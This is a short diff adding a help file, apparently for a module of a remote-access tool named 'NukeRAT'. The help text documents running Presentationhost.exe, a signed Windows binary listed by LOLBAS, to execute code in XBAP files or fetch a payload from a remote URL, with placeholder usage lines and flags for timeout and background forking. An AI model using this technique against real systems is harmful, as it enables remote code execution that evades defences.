@@ -1,0 +1,19 @@
+ABOUT
+    File is used for executing Browser applications. LOLBAS
+    documents execute code within XBAP files and downloads payload
+    from remote server.
+
+USAGE:
+    Presentationhost.exe {PATH_ABSOLUTE:.xbap}
+    Presentationhost.exe {REMOTEURL}
+
+EXAMPLES:
+    Presentationhost.exe {PATH_ABSOLUTE:.xbap}
+    Presentationhost.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    Presentationhost.exe {PATH_ABSOLUTE:.xbap}
